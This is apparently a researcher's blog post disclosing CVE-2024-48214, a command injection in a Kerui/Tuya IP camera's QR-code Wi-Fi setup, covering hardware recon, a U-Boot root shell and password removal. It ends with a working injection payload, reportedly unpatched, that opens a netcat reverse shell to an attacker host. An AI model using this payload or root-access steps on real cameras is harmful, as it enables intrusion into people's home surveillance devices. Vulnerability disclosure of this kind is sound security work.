[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F2d56848870c2&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40shenhavmor%2Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40shenhavmor%2Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Exploiting a Chinese camera for fun CVE-2024–48214

[![Shenhav Mor](https://miro.medium.com/v2/resize:fill:88:88/1*mkR0enbxPtj253Og74Bbig.jpeg)](/%40shenhavmor?source=post_page---byline--2d56848870c2--------------------------------)

[Shenhav Mor](/%40shenhavmor?source=post_page---byline--2d56848870c2--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ff1f06bd2dad8&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40shenhavmor%2Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2&user=Shenhav+Mor&userId=f1f06bd2dad8&source=post_page-f1f06bd2dad8--byline--2d56848870c2---------------------post_header-----------)

9 min read·Oct 27, 2024

--

Listen

Share

Kerui IP camera QR Code scan to RCE

**Introduction**

CVE-2024–48214 is a QR code scan to RCE on [KERUI IP Camera](https://www.keruistore.com/kerui-hd-3mp-1080p-tuya-app-ip-camera.html)

This article primarily discusses the key aspects of the CVE, The research journey was both fun and led to various other directions. My goal is to provide a comprehensive overview of the IoT research process while keeping it concise. Digging into every detail would turn this into a book — and that’s not our purpose here.

**So how did I start my research journey?**

Bought a camera from Aliexpress and wanted it to be cheap (since I buy the products I research), found something that looked legit (hundreds of thousands of sales, etc), and also had many features. So I bought 2 of these. It has arrived, and now we have a box, and our game begins.

**Nmap**

First we would like to check if there are any open ports to the camera, maybe we have TELNET or anything we can quick check.

we tried a few simple classic scans:

```
sudo nmap -sC -sV -oN normal.txt 192.168.1.178
```
![]()

Output for the normal scan

```
sudo nmap -p- -oN all_ports.txt 192.168.1.178
```
![]()

Output for full TCP scan

```
sudo nmap -sU 192.168.1.178
```
![]()

Output for UDP scan

The only port we see that may be interesting is 6668 (TUYA custom protocol) which is interesting but not for this article.
So we have no choice but to try and find a UART port, since we would probably want to have a root shell so we can debug the system, view logs, and much more..

**UART identification:**

We opened the camera until only the inner board and motors were left, and we tried to look at the board for any TX RX labels.
As we all know UART — (Universal Asynchronous Receiver/Transmitter) is a hardware communication protocol that enables serial data exchange between devices. I won’t be explaining UART in this article but I will mention that it needs 3 wires: ground, TX, and RX, a ground point doesn’t matter to us since we can connect to any ground point on the board, we need to find the UART TX and UART RX.
Unfortunately, they did a good job and didn’t leave any marks on the TX RX of the UART on the board, also they didn’t have the standard 4-pin row of a UART that lets attackers identify it in a second. kudos to them for that…
Next what I would usually do is download the datasheet of the processor and see what pins of the processor the UART TX and RX should be in, but there isn’t a publicly available datasheet for that specific processor, I did find a datasheet for a [similar processor](https://monitor.espec.ws/files/700cafec77419c2d7705f376c974b8d0ff72_986.pdf), but it was a BGA packaging so it didn’t help me at all :/ Guess that we need to make some guesses to find the UART this time :( How?
I will say that usually on IOT devices UART will be 3.3/5 volts, in the Kerui camera it was 3.3. logical 1 will be 3.3 volts and logical 0 will be 0. So when identifying a UART tx test point, when we restart the device it will usually send some data that the bootloader outputs (In our cast the Uboot Bootloader) we should see on idle 3.3 volts, and when the Uboot sends data we will see it float between 0–3.3.

Unfortunately, I do not have a [JTAGULATOR](https://grandideastudio.com/portfolio/security/jtagulator/) or other stuff that can help me bruteforce the test points quickly. So I did an old-school move, grabbed a multimeter, and tested each point. It didn’t take a lot until I found a point that behaves that way.

![]()

The TX and RX testpoints of the UART of the board

Now we will need a [USB to UART adapter](https://he.aliexpress.com/item/32637261853.html?src=google&albch=shopping&acnt=494-037-6276&isdl=y&slnk=&plac=&mtctp=&albbt=Google_7_shopping&aff_platform=google&aff_short_key=UneMJZVf&gclsrc=aw.ds&albagn=888888&ds_e_adid=&ds_e_matchtype=&ds_e_device=c&ds_e_network=x&ds_e_product_group_id=&ds_e_product_id=he32637261853&ds_e_product_merchant_id=109036335&ds_e_product_country=IL&ds_e_product_language=iw&ds_e_product_channel=online&ds_e_product_store_id=&ds_url_v=2&albcp=19373940215&albag=&isSmbAutoCall=false&needSmbHouyi=false&gad_source=1&gclid=CjwKCAjw5qC2BhB8EiwAvqa41jCW91o1S3oln1wOX5cH0wcy7LEhZAZmVDj1zVu26cbwy8Zr0nsf_RoCxt0QAvD_BwE&gatewayAdapt=glo2isr) So we can connect the possible TX point to the RX on the adapter and see if we can view something. Since UART is asynchronous, we need also to guess the baud rate. There are many options and to my luck, they were using 115200, which is widely used and a classic baud rate.
So now we connect it to our computer and use Minicom or Putty to see if we have data.

![]()

We see output through our putty conected to the serial of the USB to UART adapter

Now we also want to be able to write stuff to the UART so we will need to find the RX test point. basically the same, it can also be 0 volts on idle depending on other stuff that I don’t want to dig deeper into. We will take that test point which we think is the one, Connect a wire to the USB adapter’s RX, simply hold a man jumper wire onto the test point, and try to press some keystrokes, if you get the correct one, It’s soldering time.

![]()

After soldering and connecting to USB to UART adapter

After soldering now we have a bootloader that we can view logs addresses and more. But I don’t care about addresses this time, I want a root shell.

Fortunately, the Uboot has a 1-second “**bootdelay”**, which lets us stop the Uboot before it starts the boot. If the “bootdelay” parameter was 0 seconds, we wouldn’t be able to stop the boot, and that could be much more annoying to use it.

![]()

We can interrupt Uboot before it boots

**Getting a root shell + TELNET and FTP**

Now we kind of want to extract the firmware image to understand what is going on with the init flow of the camera. View if we can do something to get ourselves root, maybe there is a bad password on “/etc/shadow” we can try to bruteforce?
After extracting the firmware with a [clip](https://trmm.net/SPI_flash/) and a Raspberry Pie with the [flashrom](https://hacklido.com/blog/379-firmware-extraction-from-spi-flash) program, we can look at its contents, from Uboot mtdparts command output we can understand that the main app is sitting on the last partition. so let’s look at that:

Since the device is using busybox, and busybox init will read from /etc/inittab, we should look at that:

![]()

/etc/inittab contents

As we can see here it start rcS, which will call rc.local and some other scripts until it gets interesting: It calls a script called anyka\_service.sh that will check for a configuration file called anyka\_cfg.ini, if the variable debug\_uart is set to 1, we have TELNET and FTP, how nice of them ❤

![]()

A part of the anyka\_script.sh

Eventually it will run the binary anyka\_ipc which is doing pretty much everything else in the camera.

![]()

A part of the anyka\_cfg.ini

So the only thing we need is to get the anyka\_cfg.ini and change its debug\_uart variable to 1, there are many ways to get that:

First I tried bruteforcing root’s password so I could interact with the Uboot shell I have and change the flag there. I couldn’t bruteforce it, so I’ll do something else:

Since we can stop Uboot we can do a lot of fun stuff, one of them is simply to execute /bin/sh through Uboot, by setting the init parameter as /bin/sh

```
setenv boot_normal env set bootargs console=ttySAK0,115200n8 root=/dev/mtdblock5 rootfstype=squashfs init=/bin/sh \$\{mtdparts\} \$\{mem\} \$\{memsize\}\; run read_kernel\; bootm \$\{loadaddr\} - \$\{fdtcontroladdr\}

run boot_normal
```

Now we basically have a root shell, but it is missing many of the stuff that will happen on boot and we can run /sbin/init ourselves but we dont want that. We want to get ourselves TELNET and FTP.. The anyka\_cfg.ini is on a filesystem on a partition which its name is CONFIG, simply mount that, change the flag, umount and restart. now we will have debug\_uart set, or basically TELNET and FTP. But how will we connect to the telnet? we dont have a user yet, so we will also remove the ‘x’ from the /etc/passwd file which says that there is a password for the user in the /etc/shadow file so root won’t have a password. For that scenario that was enough:
(Also created another user which is the same and named user)

![]()

The change to make root and user without a password

We have telnet :) Hurray

![]()

Root Telnet

We have uploaded a gdbserver and tcpdump to the camera using the FTP that we have now.
now we can debug the camera main binary, which is the anyka\_ipc, After a good reverse engineering sessions, we have found the vulnerability:

# **The Vulnerability**

**What is a QR Code:**

Chatgpt — “A **QR code** (Quick Response code) is a type of two-dimensional barcode that can store information in a way that is easily scannable by devices like smartphones, tablets, and QR code readers.”

The camera uses the QR code mechanism to connect to the Wifi of the user. When you open the camera when it’s not connected to any Wifi, it is in its provisioning mode, In that mode there is a thread that tries to scan a QR code from the camera’s POV. When it finds that QR Code, it should have a JSON with 3 parameters:
s — SSID (Service Set Identifier) — your wifi name
p — Password of the Wifi
t — token
Well basically we don’t care about how QR is implemented, the only thing we care about is how that connects to the vulnerability.

Lets give a brief overview on how the exploit works and dive into the code:

![]()

A Diagram that shows the flow of the code leading to the exploit

Basically that QR code thread is scanning QRs as we’ve already mentioned, it runs a loop and calls the magic function which I kept unnamed “sub\_AD1D0” which calls some external libraries including zbar (for QR parsing), that function tries to scan a QR and returns a JSON of its content. If it finds a QR it will break the while and call the function qr\_code\_connect\_wifi with the JSON as its parameter:

![]()

The QR Thread that runs in the background

In that qr\_code\_connect\_wifi function, we can see it parses the JSON from before and extracts the s, p, and b? Until now I didn’t know what that was supposed to be. I guess it’s a misspelling of t? The Tuya Smart Life application generates a token, which could have been used here but, it doesn’t? If they would use it mightv’e been harder to simply get the camera to parse any QR like it is now.

![]()

qr\_code\_connect\_wifi function contents

Lets leave all the other overflows aside, since they will anyways be much harder to implement, and we have the easier way.

The vulnerability (well the worst one in that code) lies in the function sys\_connect\_wifi. who is being called with the SSID and password from the QR.

![]()

I guess davis didn’t do a gj after all :( we still love you though ❤

Again ignore the other vulnerabilities we have here and let’s focus on the worst one: as we can see from line 39 to 41, we are copying a string with who connects to the wifi with our ssid and password, but wait.. Why there is no sanitizing of our input? A classic command injection vulnerability.

From there it will enter system\_cmd who will call system eventually and trigger our vulnerability.

![]()

system\_cmd function

# Abusing the command injection

The camera connects to the Wi-fi using a script called lv\_wifi\_connect.sh, since we are in provisioning mode, and we have no connection to our LAN from the camera, we can’t simply inject a Netcat reverse shell. We need first to connect the wifi and after that when we are connected, run a reverse shell from the camera and connect to our Netcat listener.

Since both SSID and PASSWORD are contenders for the command injection, I have picked the password. And I injected the following line:

```
$(sh /usr/sbin/lv_wifi_connect.sh {SSID} {PASSWORD} & sleep 30; nc {NC_IP} {NC_PORT} -e /bin/sh)
# Create a QR code with data
```

What would happen here, is that the camera will parse the parameters, s, and p (will completely ignore t as we have said) and continue to the part where the vulnerability triggers, there instead of sending the lv\_wifi\_connect.sh script the password parameter, it will execute the connection to the WIFI, as set from the SSID and PASSWORD variables. Wait for a few seconds and then trigger a reverse shell that will connect to your listener.

Unfortunately, TUYA has not responded for more than 90 days, and the bug has not been fixed.

[Vulnerability](/tag/vulnerability?source=post_page-----2d56848870c2--------------------------------)[Ip Camera](/tag/ip-camera?source=post_page-----2d56848870c2--------------------------------) Unlisted

--

--

[![Shenhav Mor](https://miro.medium.com/v2/resize:fill:96:96/1*mkR0enbxPtj253Og74Bbig.jpeg)](/%40shenhavmor?source=post_page---post_author_info--2d56848870c2--------------------------------)[![Shenhav Mor](https://miro.medium.com/v2/resize:fill:128:128/1*mkR0enbxPtj253Og74Bbig.jpeg)](/%40shenhavmor?source=post_page---post_author_info--2d56848870c2--------------------------------)Follow[## Written by Shenhav Mor](/%40shenhavmor?source=post_page---post_author_info--2d56848870c2--------------------------------)[2 Followers](/%40shenhavmor/followers?source=post_page---post_author_info--2d56848870c2--------------------------------)·[2 Following](/%40shenhavmor/following?source=post_page---post_author_info--2d56848870c2--------------------------------)Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----2d56848870c2--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----2d56848870c2--------------------------------)[About](/about?autoplay=1&source=post_page-----2d56848870c2--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----2d56848870c2--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----2d56848870c2--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----2d56848870c2--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----2d56848870c2--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----2d56848870c2--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----2d56848870c2--------------------------------)[Teams](/business?source=post_page-----2d56848870c2--------------------------------)

